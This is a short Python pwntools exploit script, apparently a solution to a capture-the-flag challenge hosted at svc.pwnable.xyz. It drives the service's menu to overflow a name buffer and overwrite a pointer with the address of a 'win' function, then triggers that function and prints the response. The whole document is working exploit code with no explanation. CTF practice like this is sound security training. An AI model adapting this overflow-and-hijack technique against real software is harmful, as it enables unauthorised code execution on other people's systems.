from pwn import *

win = 0x40092c

r = remote("svc.pwnable.xyz", 30023)
# r = process("/home/kali/Downloads/challenge")

r.recvuntil(b">")
r.send(b"1\n")
r.recvuntil(b"name:")
r.send(b"B"*32 + b"1\n")
r.recvuntil(b"name:")
r.send(b"\n")

r.recvuntil(b">")
r.send(b"2\n")
r.recvuntil(b"index:")
r.send(b"0\n")
r.recvuntil(b"name:")
r.send(b"B"*33 + b"1\n")
r.recvuntil(b"name")
r.send(b"\n")

r.recvuntil(b">")
r.send(b"2\n")
r.recvuntil(b"index:")
r.send(b"0\n")
r.recvuntil(b"name:")
r.send(bytes("B"*40, "utf-8") + p64(win) + bytes("\n", "utf-8"))

r.recvuntil(b">")
r.send(b"3\n")
r.recvuntil(b"index:")
r.send(b"0\n")

print (r.recv(1024))
print (r.recv(1024))

